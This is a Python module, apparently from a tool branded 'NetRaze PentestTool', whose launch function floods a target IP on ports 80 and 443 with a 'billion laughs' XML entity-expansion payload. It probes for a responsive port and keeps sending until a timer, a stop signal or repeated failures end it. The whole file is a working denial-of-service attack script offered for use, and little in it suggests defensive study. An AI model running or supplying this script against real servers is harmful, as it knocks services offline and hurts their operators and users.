import requests
import time

def launch(target_ip, port_list, duration, tag, stop_event, fail_tracker):
    xml_payload = """<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>"""

    headers = {
        "Content-Type": "application/xml",
        "User-Agent": "NetRaze PentestTool"
    }

    prioritized_ports = [80, 443]

    start_time = time.time()
    active_port = None

    while not stop_event.is_set():
        if duration and time.time() - start_time > duration:
            print(f"[+] Attack duration ended for {tag}.")
            break

        # Determine active port if not set
        if active_port is None:
            port_found = False
            for port in prioritized_ports:
                if port not in port_list:
                    continue

                schemes = ["http"] if port == 80 else ["https", "http"]
                for scheme in schemes:
                    url = f"{scheme}://{target_ip}:{port}/"
                    try:
                        r = requests.post(url, data=xml_payload, headers=headers, timeout=5)
                        if r.status_code < 400:
                            active_port = port
                            port_found = True
                            break  # Found active port, stop checking other schemes
                    except Exception:
                        continue
                if port_found:
                    break

            if not port_found:
                # Neither port active — stop attack
                print(f"[x] {tag} stopped: Neither port 80 nor 443 is active.")
                stop_event.set()
                return

        # Attack on active port only
        port = active_port
        schemes = ["http"] if port == 80 else ["https", "http"]
        failed = 0

        for scheme in schemes:
            url = f"{scheme}://{target_ip}:{port}/"
            try:
                r = requests.post(url, data=xml_payload, headers=headers, timeout=5)
                if r.status_code >= 400:
                    failed += 1
                    print(f"[!] {tag} {url} returned status {r.status_code}. Fail count: {failed}")
                else:
                    # Success, break scheme loop, continue attack on this port
                    break
            except Exception as e:
                failed += 1
                print(f"[!] {tag} {url} request exception: {e}. Fail count: {failed}")

            if failed > 20:
                print(f"[!] Too many failures, stopping attack {tag}-{port}")
                fail_tracker.append(f"{tag}-{port}")
                stop_event.set()
                return

        # If failed on all schemes, reset active_port to trigger re-detection next loop
        if failed > 0:
            active_port = None
